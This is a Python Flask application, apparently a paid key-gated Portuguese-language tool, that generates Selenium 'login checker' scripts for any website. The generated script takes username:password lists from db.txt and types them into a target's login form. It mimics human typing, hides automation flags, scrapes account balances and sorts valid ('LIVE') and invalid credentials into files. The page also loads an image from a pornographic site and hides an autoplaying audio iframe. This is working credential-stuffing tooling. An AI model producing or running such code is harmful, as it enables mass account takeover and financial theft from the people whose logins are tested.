#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
⚡ SELENIUM AUTO CODER v7 - COM LOGIN + KEY
Sistema de Login com Keys + Auto Coder
By @cybersecofc
"""

import os, sys, json, time, uuid, re, random, secrets, threading
from datetime import datetime, timedelta

def install(pkg):
    try: __import__(pkg.replace('-','_').replace('.','_'))
    except: os.system(f"{sys.executable} -m pip install {pkg} --quiet 2>nul")

for d in ['flask','flask-cors','werkzeug','requests','colorama']: install(d)

from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for
from flask_cors import CORS
import requests as http_requests
from colorama import init, Fore, Style
init(autoreset=True)

PORT = int(os.environ.get('PORT', 5000))
BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', f'http://localhost:{PORT}')
app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
CORS(app)
os.makedirs('scripts_gerados', exist_ok=True)

# ============================================
# BANCO DE DADOS DE KEYS
# ============================================
KEYS = {
    "dopeey2233vipbot/id223309893": {"user": "@dopeeydev", "expira": "14/07/2026"},
    "chuky2233vipbot/id223309893": {"user": "@chuckysuport", "expira": "14/07/2026"},
    "kggs012233vipbot/id228565959565": {"user": "@kggs01", "expira": "14/07/2026"},
    "772233vipbot/id258484895": {"user": "@77", "expira": "14/07/2026"},
    "Satoxzlapvipbot/id14062026123456": {"user": "@Satoxzlap", "expira": "16/07/2026"},
    "Dearrascaeta_85vipbot/id1406202612345": {"user": "@Dearrascaeta_85", "expira": "16/07/2026"},
    "elbig171vipbot/id27062026053734": {"user": "@elbig171", "expira": "16/07/2026"},
    "usuarionmbysvipbot/id27062026053734": {"user": "@usuarionmbys", "expira": "17/07/2026"},
    "f1l1p3vipbot/id27062026053734": {"user": "@F1l1p3", "expira": "18/07/2026"},
    "mwx_oficialvipbot/id27062026053734": {"user": "@MWX_OFICIAL", "expira": "17/07/2026"},
    "grupofreevipbot/id27062026053734": {"user": "GRUPOFREE", "expira": "18/07/2026"},
    "dreamvipbot/id27062026053734": {"user": "dream", "expira": "21/07/2026"},
    "rauldefranjavipbot/id27062026053734": {"user": "@Rauldefranja", "expira": "22/07/2026"},
    "kaiooojaajvipbot/id27062026053734": {"user": "@kaioOojaaj", "expira": "27/07/2026"}
}

MUSIC = "https://www.youtube.com/embed/5eenCZAXp5A?autoplay=1&loop=1&playlist=5eenCZAXp5A&controls=0&disablekb=1&modestbranding=1&rel=0&showinfo=0&fs=0&iv_load_policy=3"
BG_IMAGE = "https://www.pornolandia.xxx/media/photos/250691.jpg"

CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600;700&display=swap');
    @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css');
    :root{--bg:#0a0a12;--s1:#111122;--s2:#181830;--b:#252545;--p:#ff6b35;--su:#00e676;--d:#ff3355;--w:#ffaa00;--a:#9944ff;--t:#e8e8f5;--t2:#8888bb;--t3:#555588}
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--t);min-height:100vh}
    
    .login-container {
        display: flex; justify-content: center; align-items: center; min-height: 100vh;
        background-image: url('BG_PLACEHOLDER');
        background-size: cover; background-position: center; background-repeat: no-repeat;
        background-attachment: fixed;
        position: relative;
    }
    .login-container::before {
        content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.45);
    }
    .login-box {
        position: relative; z-index: 1;
        background: rgba(20,20,35,0.55); border: 1px solid rgba(255,107,53,0.5);
        border-radius: 20px; padding: 40px; max-width: 450px; width: 90%;
        box-shadow: 0 20px 60px rgba(0,0,0,0.4); backdrop-filter: blur(12px);
        text-align: center;
    }
    .login-box .logo {
        font-family: 'Orbitron', sans-serif; font-size: 2em; font-weight: 900;
        background: linear-gradient(135deg, #ff6b35, #ffaa00);
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        margin-bottom: 10px;
    }
    .login-box .subtitle { color: rgba(255,255,255,0.7); font-size: 0.8em; margin-bottom: 30px; letter-spacing: 2px; }
    .login-box input {
        width: 100%; padding: 14px 18px; background: rgba(0,0,0,0.35);
        border: 2px solid rgba(255,107,53,0.4); border-radius: 12px;
        color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 0.9em;
        outline: none; transition: all 0.3s; text-align: center;
        backdrop-filter: blur(5px);
    }
    .login-box input::placeholder { color: rgba(255,255,255,0.5); }
    .login-box input:focus { border-color: #ff6b35; box-shadow: 0 0 20px rgba(255,107,53,0.3); background: rgba(0,0,0,0.5); }
    .login-box .btn {
        width: 100%; padding: 14px; border: none; border-radius: 12px;
        background: linear-gradient(135deg, #ff6b35, #ff4500); color: #fff;
        font-weight: 700; font-size: 1em; cursor: pointer; margin-top: 15px;
        letter-spacing: 1px; transition: all 0.3s;
    }
    .login-box .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(255,107,53,0.4); }
    .error { color: #ff3355; margin-top: 12px; font-size: 0.85em; }
    
    .app{max-width:1000px;margin:0 auto;padding:20px;position:relative;z-index:1}
    .header{text-align:center;padding:35px 20px 25px;position:relative}
    .header::before{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:250px;height:250px;background:radial-gradient(circle,rgba(255,107,53,.08) 0%,transparent 70%);pointer-events:none}
    .logo-main{font-family:'Orbitron',sans-serif;font-size:2.5em;font-weight:900;letter-spacing:4px;background:linear-gradient(135deg,#ff6b35,#ffaa00,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent;position:relative;z-index:1;animation:glow 2s ease-in-out infinite alternate}
    @keyframes glow{from{filter:brightness(1)}to{filter:brightness(1.3)}}
    .subtitle{font-family:'JetBrains Mono',monospace;color:var(--t3);letter-spacing:3px;font-size:.85em;margin-top:10px}
    .badge-row{display:flex;justify-content:center;gap:10px;margin-top:15px;flex-wrap:wrap}
    .badge{padding:6px 16px;border-radius:20px;font-size:.75em;font-weight:600;letter-spacing:1px}
    .badge-p{background:rgba(255,107,53,.15);color:var(--p);border:1px solid rgba(255,107,53,.3)}
    .badge-g{background:rgba(0,230,118,.15);color:var(--su);border:1px solid rgba(0,230,118,.3)}
    .badge-a{background:rgba(153,68,255,.15);color:var(--a);border:1px solid rgba(153,68,255,.3)}
    .card{background:var(--s2);border:1px solid var(--b);border-radius:16px;padding:28px;margin-bottom:20px;box-shadow:0 8px 32px rgba(0,0,0,.3)}
    .card-title{font-size:1.2em;font-weight:700;margin-bottom:8px;color:var(--p);display:flex;align-items:center;gap:10px}
    .card-desc{color:var(--t2);font-size:.85em;margin-bottom:20px}
    .form-group{margin-bottom:16px}
    .form-label{display:block;font-weight:600;margin-bottom:6px;color:var(--t2);font-size:.85em}
    .form-input,textarea{width:100%;padding:12px 16px;background:var(--bg);border:2px solid var(--b);border-radius:10px;color:var(--t);font-family:'JetBrains Mono',monospace;font-size:.85em;outline:none;transition:all .3s}
    .form-input:focus,textarea:focus{border-color:var(--p);box-shadow:0 0 0 4px rgba(255,107,53,.3)}
    textarea{min-height:200px;resize:vertical}
    .btn-main{padding:12px 24px;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:.9em;letter-spacing:1px;transition:all .3s;display:inline-flex;align-items:center;gap:8px;text-decoration:none;font-family:'Inter',sans-serif}
    .btn-p{background:linear-gradient(135deg,#ff6b35,#ff4500);color:#fff;box-shadow:0 4px 20px rgba(255,107,53,.3)}
    .btn-p:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,107,53,.3)}
    .btn-s{background:linear-gradient(135deg,var(--su),#00c853);color:#000}
    .btn-block{width:100%;justify-content:center}
    .btn-logout{background:var(--d);color:#fff;padding:8px 16px;border-radius:8px;text-decoration:none;font-size:.8em}
    .code-block{background:#000;border:1px solid var(--b);border-radius:10px;padding:20px;font-family:'JetBrains Mono',monospace;color:#00ff88;overflow-x:auto;white-space:pre-wrap;max-height:500px;overflow-y:auto;font-size:.8em;line-height:1.5}
    .alert{padding:14px 18px;border-radius:10px;margin:14px 0;font-weight:500;display:flex;align-items:center;gap:10px}
    .alert-s{background:rgba(0,230,118,.1);border:1px solid rgba(0,230,118,.3);color:var(--su)}
    .alert-e{background:rgba(255,51,85,.1);border:1px solid rgba(255,51,85,.3);color:var(--d)}
    .alert-i{background:rgba(255,107,53,.1);border:1px solid rgba(255,107,53,.3);color:var(--p)}
    .top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
    @media(max-width:768px){.logo-main{font-size:2em}.card{padding:18px}}
</style>
"""

# ============================================
# PARSER + GERADOR
# ============================================
class Parser:
    def parse(text):
        lines = text.strip().split('\n')
        steps, first = [], None
        for line in lines:
            line = line.strip()
            if not line: continue
            if line.startswith('http'):
                if not first: first = line
                steps.append({'t':'url','v':line,'d':'Navegar'})
                continue
            if line.startswith('<'):
                p = Parser._tag(line)
                if p: steps.append(p)
        return steps, first

    def _tag(html):
        attrs = dict(re.findall(r'(\w[\w-]*)\s*=\s*"([^"]*)"', html))
        m = re.match(r'<(\w+)', html)
        tag = m.group(1).lower() if m else ''
        if tag not in ['input','button','a','div','span','select','textarea']: return None
        it = attrs.get('type','').lower()
        nm = attrs.get('name','')
        ida = attrs.get('id','')
        ph = attrs.get('placeholder','')
        ac = attrs.get('autocomplete','')
        cl = attrs.get('class','')
        vl = attrs.get('value','')
        tx = re.search(r'>([^<]*)<', html)
        tx = tx.group(1).strip() if tx else ''
        if ida and ida not in ['false','']: sel = f"#{ida}"
        elif nm: sel = f"{tag}[name='{nm}']"
        elif ph: sel = f"{tag}[placeholder='{ph}']"
        elif ac: sel = f"{tag}[autocomplete='{ac}']"
        elif vl: sel = f"{tag}[value='{vl}']"
        else: sel = tag
        if it == 'hidden': return None
        click_words = ['btn','button','entrar','login','submit','enviar','acessar','sign','continuar','next','proximo','confirmar','ok','go','ir','cadastrar','registrar','criar','conta','comprar','pagar','finalizar','salvar','cancel','voltar','back','search','buscar','pesquisar','send','acessa','loga','validar','verificar','confirm','done','pronto','concluir','okay','yes','sim','aceitar','concordo','continue','prosseguir','apply','aplicar','add','adicionar','remove','remover','delete','excluir','edit','editar','update','atualizar','download','upload','baixar','open','abrir','close','fechar','exit','sair','start','iniciar','começar','stop','parar','play','like','share','compartilhar','follow','seguir','settings','configurações','profile','perfil','account','conta','logout','deslogar','sign out','sign in','sign up','register now','cadastre-se','criar conta','faça login','fazer login','entrar agora','acessar conta','minha conta','painel','dashboard']
        combined = f"{cl} {tx} {vl} {nm} {ida} {ph} {ac}".lower()
        is_btn = tag == 'button' or (tag == 'input' and it in ['submit','button','reset']) or (tag == 'a' and tx) or (tag == 'div' and tx and any(w in combined for w in click_words)) or (tag == 'span' and tx and any(w in combined for w in click_words))
        if is_btn:
            dt = tx or vl or 'Click'
            return {'t':'click','s':sel,'x':dt,'d':f'Clicar: {dt[:40]}'}
        if tag in ['input','textarea']:
            c = 'user' if it == 'email' or re.search(r'(user|username|login|email|mail|cpf|document)',f"{nm} {ida} {ph} {ac}".lower()) else 'pass' if it == 'password' or re.search(r'(password|senha|pass|pwd)',f"{nm} {ida} {ph} {ac}".lower()) else 'text'
            return {'t':'input','s':sel,'c':c,'d':f'Digitar: {c}'}
        if tag == 'select': return {'t':'select','s':sel,'d':'Selecionar'}
        return None

class Gen:
    def generate(steps, name='script.py', url=None):
        L = []
        L.append('#!/usr/bin/env python3')
        L.append('# -*- coding: utf-8 -*-')
        L.append(f'# Auto Coder v7 | Execute: python {name}')
        L.append('import os,sys,time,random,re,json')
        L.append('from datetime import datetime')
        L.append('from selenium import webdriver')
        L.append('from selenium.webdriver.common.by import By')
        L.append('from selenium.webdriver.chrome.service import Service')
        L.append('from selenium.webdriver.chrome.options import Options')
        L.append('from selenium.webdriver.support.ui import WebDriverWait')
        L.append('from selenium.webdriver.support import expected_conditions as EC')
        L.append('')
        L.append('for p in ["selenium","webdriver-manager","colorama"]:')
        L.append('    try:__import__(p.replace("-","_"))')
        L.append('    except:os.system(f"{sys.executable} -m pip install {p} --quiet")')
        L.append('from webdriver_manager.chrome import ChromeDriverManager')
        L.append('from colorama import init,Fore,Style')
        L.append('init(autoreset=True)')
        L.append('')
        L.append('C=Fore.CYAN;G=Fore.GREEN;R=Fore.RED;Y=Fore.YELLOW;W=Fore.WHITE;M=Fore.MAGENTA;E=Style.RESET_ALL')
        L.append('DB="db.txt";LF="lives.txt";DF="dies.txt"')
        L.append('')
        L.append('def load(f):')
        L.append('    L=[]')
        L.append('    if not os.path.exists(f):return L')
        L.append('    for l in open(f,"r",encoding="utf-8"):')
        L.append('        l=l.strip()')
        L.append('        if l and not l.startswith("#"):')
        L.append('            p=l.split(":")')
        L.append('            if len(p)>=2:L.append({"u":p[0].strip(),"p":":".join(p[1:]).strip()})')
        L.append('    return L')
        L.append('')
        L.append('def th(el,tx):')
        L.append('    for c in tx:el.send_keys(c);time.sleep(random.uniform(0.02,0.08))')
        L.append('def rd(a=0.3,b=1.2):time.sleep(random.uniform(a,b))')
        L.append('')
        L.append('def novo_driver():')
        L.append('    opts=Options()')
        L.append('    opts.add_argument("--no-sandbox")')
        L.append('    opts.add_argument("--disable-dev-shm-usage")')
        L.append('    opts.add_argument("--disable-blink-features=AutomationControlled")')
        L.append('    opts.add_argument("--window-size=1920,1080")')
        L.append('    opts.add_argument("--ignore-certificate-errors")')
        L.append('    opts.add_experimental_option("excludeSwitches",["enable-automation"])')
        L.append('    opts.add_experimental_option("useAutomationExtension",False)')
        L.append('    try:return webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=opts)')
        L.append('    except:return webdriver.Chrome(options=opts)')
        L.append('')
        L.append('def clicar(driver):')
        L.append('    for sel in ["button[type=\'submit\']","input[type=\'submit\']","//button[contains(text(),\'Entrar\')]","//button[contains(text(),\'Login\')]","//button[contains(text(),\'Sign\')]","//button[contains(text(),\'Acessar\')]","//button[contains(text(),\'Continuar\')]","//button[contains(text(),\'Enviar\')]","//*[@type=\'submit\']","form button","form input[type=\'submit\']"]:')
        L.append('        try:')
        L.append('            btn=driver.find_element(By.XPATH,sel) if sel.startswith("//") else driver.find_element(By.CSS_SELECTOR,sel)')
        L.append('            if btn.is_displayed() and btn.is_enabled():')
        L.append('                driver.execute_script("arguments[0].scrollIntoView(true);",btn);rd(0.3,0.7);btn.click();return True')
        L.append('        except:continue')
        L.append('    return False')
        L.append('')
        L.append('def main():')
        L.append('    sep="="*50;sep2="-"*40')
        L.append('    print(f"{C}LOGIN CHECKER v7{E}");print(f"{C}{sep}{E}\\n")')
        L.append('    logins=load(DB)')
        L.append('    if not logins:print(f"{R}[!] Nenhum login em {DB}{E}");return')
        L.append('    print(f"{C}[*] {len(logins)} logins{E}\\n")')
        L.append('    lives,dies=[],[]')
        L.append('    for i,lg in enumerate(logins,1):')
        L.append('        t1=datetime.now();cs=f"{lg[\'u\']}:{lg[\'p\']}"')
        L.append('        print(f"\\n{C}[{i}/{len(logins)}] {lg[\'u\']}{E}");print(f"{C}{sep2}{E}")')
        L.append('        driver=novo_driver()')
        for s in steps:
            if s['t'] == 'url':
                L.append(f'        driver.get("{s["v"]}");rd(2,4)')
            elif s['t'] == 'input':
                sel = s['s']; cat = s['c']
                L.append(f'        try:')
                L.append(f'            el=WebDriverWait(driver,15).until(EC.presence_of_element_located((By.CSS_SELECTOR,"{sel}")))')
                L.append('            driver.execute_script("arguments[0].scrollIntoView(true);",el);rd(0.3,0.7)')
                L.append('            el.click();el.clear();rd(0.2,0.5)')
                if cat == 'user': L.append('            th(el,lg["u"])')
                elif cat == 'pass': L.append('            th(el,lg["p"])')
                else: L.append('            el.send_keys("test")')
                L.append('        except:pass')
            elif s['t'] == 'click':
                sel = s['s']
                L.append(f'        try:')
                L.append(f'            btn=WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"{sel}")))')
                L.append('            driver.execute_script("arguments[0].scrollIntoView(true);",btn);rd(0.3,0.8);btn.click()')
                L.append('        except:pass')
        L.append('        clicar(driver)')
        L.append('        rd(3,5);t2=datetime.now();ts=round((t2-t1).total_seconds(),1)')
        L.append('        try:pt=driver.find_element(By.TAG_NAME,"body").text')
        L.append('        except:pt=driver.page_source')
        L.append('        pl=pt.lower()')
        L.append('        saldo="";erro=""')
        L.append('        for p in [r\'R\\\\$\\\\s*[\\\\d.,]+\',r\'\\\\d+[.,]\\\\d{2}\',r\'saldo[^\\\\n]*\']:')
        L.append('            m=re.search(p,pt,re.I)')
        L.append('            if m:saldo=m.group(0)[:30];break')
        L.append('        for p in [r\'incorrect[^\\\\n]*\',r\'invalid[^\\\\n]*\',r\'error[^\\\\n]*\']:')
        L.append('            m=re.search(p,pt,re.I)')
        L.append('            if m:erro=m.group(0)[:40];break')
        L.append('        if not erro:erro=pt[:40].replace("\\n"," ").strip()')
        L.append('        ok=["welcome","bem-vindo","dashboard","painel","minha conta","my account","logado","logout","sair","success","sucesso"]')
        L.append('        fl=["incorrect","incorreto","invalid","invalido","error","erro","wrong","fail","falha"]')
        L.append('        if any(w in pl for w in ok):')
        L.append('            msg=saldo if saldo else "LOGADO COM SUCESSO"')
        L.append('            print(f"{G}LIVE ~> {cs} ~> {msg} ~> @cybersecofc ~> {ts}s{E}");lives.append(cs)')
        L.append('        elif any(w in pl for w in fl):')
        L.append('            msg=erro if erro else "LOGIN INVALIDO"')
        L.append('            print(f"{R}DIE ~> {cs} ~> {msg} ~> @cybersecofc ~> {ts}s{E}");dies.append(cs)')
        L.append('        else:')
        L.append('            print(f"{Y}UNKNOWN ~> {cs} ~> {erro} ~> @cybersecofc ~> {ts}s{E}");dies.append(cs)')
        L.append('        driver.quit()')
        L.append('    for fn,data in [(LF,lives),(DF,dies)]:')
        L.append('        with open(fn,"w",encoding="utf-8") as f:')
        L.append('            for d in data:f.write(d+"\\n")')
        L.append('    print(f"\\n{C}{sep}{E}");print(f"{C}{G}{{len(lives)}} LIVES{C} | {R}{{len(dies)}} DIES{E}");print(f"{C}{sep}{E}")')
        L.append('    print(f"\\n{M}@cybersecofc{E}")')
        L.append('if __name__=="__main__":')
        L.append('    try:main()')
        L.append('    except KeyboardInterrupt:print(f"\\n{Y}[!] Fim{E}")')
        return '\n'.join(L)

# ============================================
# PÁGINAS
# ============================================
LOGIN_PAGE = f"""<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Auto Coder v7 - Login</title>{CSS.replace('BG_PLACEHOLDER', BG_IMAGE)}</head><body>
<iframe src="{MUSIC}" allow="autoplay" style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0;border:none;pointer-events:none" id="mf"></iframe>
<script>setInterval(function(){{try{{document.getElementById('mf').contentWindow.postMessage('{{"event":"command","func":"playVideo","args":""}}','*');}}catch(e){{}}}},3000);</script>
<div class="login-container">
    <div class="login-box">
        <div class="logo">AUTO CODER v7</div>
        <div class="subtitle">🔑 DIGITE SUA KEY</div>
        <form method="POST">
            <input type="text" name="key" placeholder="cole sua key aqui..." required>
            <button type="submit" class="btn">ENTRAR</button>
        </form>
        <div class="error">{{error}}</div>
    </div>
</div>
</body></html>"""

MAIN_PAGE = f"""<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Auto Coder v7</title>{CSS}</head><body>
<iframe src="{MUSIC}" allow="autoplay" style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0;border:none;pointer-events:none" id="mf"></iframe>
<script>setInterval(function(){{try{{document.getElementById('mf').contentWindow.postMessage('{{"event":"command","func":"playVideo","args":""}}','*');}}catch(e){{}}}},3000);</script>
<div class="app">
    <div class="top-bar">
        <div><span style="color:var(--su);">✅ Logado: {{{{ user }}}}</span> | <span style="color:var(--t3);">Expira: {{{{ expira }}}}</span></div>
        <a href="/logout" class="btn-logout">SAIR</a>
    </div>
    <div class="header"><div class="logo-main">AUTO CODER v7</div><div class="subtitle">LOGIN CHECKER</div><div class="badge-row"><span class="badge badge-p">Selenium</span><span class="badge badge-g">Login</span><span class="badge badge-a">Qualquer Site</span></div></div>
    <div class="card"><div class="card-title">🔑 Gerador de Script</div><div class="card-desc"><b>Como usar:</b><br>1. Cole <b>URL</b> do site<br>2. Cole <b>campos HTML</b><br>3. Clique <b>GERAR</b><br>4. Logins em <b>db.txt</b> (login:senha)<br>5. Execute: <code>python script.py</code></div>
    <form id="f"><div class="form-group"><label class="form-label">URL + Campos HTML</label><textarea id="st" class="form-input" placeholder="Cole aqui..."></textarea></div>
    <div class="form-group"><label class="form-label">Nome do Arquivo</label><input type="text" id="nm" class="form-input" value="login_checker.py"></div>
    <div style="display:flex;gap:10px"><button type="submit" class="btn-main btn-p">⚡ GERAR</button><button type="button" class="btn-main btn-s" onclick="dl()">📥 BAIXAR</button></div></form><div id="mg" style="margin-top:15px"></div></div>
    <div class="card" id="pv" style="display:none"><div class="card-title">Script Gerado</div><div class="code-block" id="cd"></div><div id="sl" style="margin-top:15px"></div></div></div>
<script>
var sc='';var fn='login_checker.py';
document.getElementById('f').addEventListener('submit',async function(e){{
e.preventDefault();document.getElementById('mg').innerHTML='<div class="alert alert-i">Gerando...</div>';
fn=document.getElementById('nm').value||'login_checker.py';
try{{
var r=await fetch('/api/generate',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{steps:document.getElementById('st').value,script_name:fn}})}});
var d=await r.json();
if(d.success){{sc=d.script;document.getElementById('mg').innerHTML='<div class="alert alert-s">Script com '+d.steps_count+' passos!</div>';
document.getElementById('pv').style.display='block';document.getElementById('cd').textContent=sc;
if(d.parsed_steps){{var h='<h4 style="color:var(--p)">Passos:</h4><div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:10px">';
d.parsed_steps.forEach(function(s,i){{h+='<span class="badge badge-p">'+(i+1)+'. '+s.d+'</span>';}});h+='</div>';document.getElementById('sl').innerHTML=h;}}
document.getElementById('pv').scrollIntoView({{behavior:'smooth'}});}}else{{document.getElementById('mg').innerHTML='<div class="alert alert-e">'+d.message+'</div>';}}
}}catch(e){{document.getElementById('mg').innerHTML='<div class="alert alert-e">Erro!</div>';}}
}});
function dl(){{if(!sc){{alert('Gere primeiro!');return;}}var b=new Blob([sc],{{type:'text/python'}});var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=fn;a.click();}}
</script></body></html>"""

# ============================================
# ROTAS
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if 'key' in session:
        return redirect('/app')
    error = ''
    if request.method == 'POST':
        key = request.form.get('key', '').strip()
        if key in KEYS:
            session['key'] = key
            session['user'] = KEYS[key]['user']
            session['expira'] = KEYS[key]['expira']
            return redirect('/app')
        else:
            error = '❌ KEY INVALIDA!'
    return render_template_string(LOGIN_PAGE, error=error)

@app.route('/app')
def main_app():
    if 'key' not in session:
        return redirect('/')
    return render_template_string(MAIN_PAGE, user=session.get('user',''), expira=session.get('expira',''))

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/api/generate', methods=['POST'])
def api_gen():
    if 'key' not in session:
        return jsonify({'success':False,'message':'Nao autenticado!'})
    d = request.json
    txt = d.get('steps','')
    nm = d.get('script_name','script.py')
    if not txt.strip(): return jsonify({'success':False,'message':'Cole algo!'})
    steps, url = Parser.parse(txt)
    useful = [s for s in steps if s['t'] in ['url','input','click']]
    if not useful: return jsonify({'success':False,'message':'Nada detectado!'})
    script = Gen.generate(useful, nm, url)
    with open(f'scripts_gerados/{nm}','w',encoding='utf-8') as f: f.write(script)
    descs = [{'d':s.get('d',s['t'])} for s in useful]
    return jsonify({'success':True,'message':'OK','script':script,'steps_count':len(useful),'parsed_steps':descs})

@app.route('/ping')
def ping(): return jsonify({'status':'online'})

def ka():
    while True:
        try: http_requests.get(f"{BASE_URL}/ping", timeout=10)
        except: pass
        time.sleep(240)

if __name__ == '__main__':
    threading.Thread(target=ka, daemon=True).start()
    print(f"\n{Fore.CYAN}AUTO CODER v7 - LOGIN + KEY{Style.RESET_ALL}")
    print(f"{Fore.WHITE}http://localhost:{PORT}{Style.RESET_ALL}\n")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
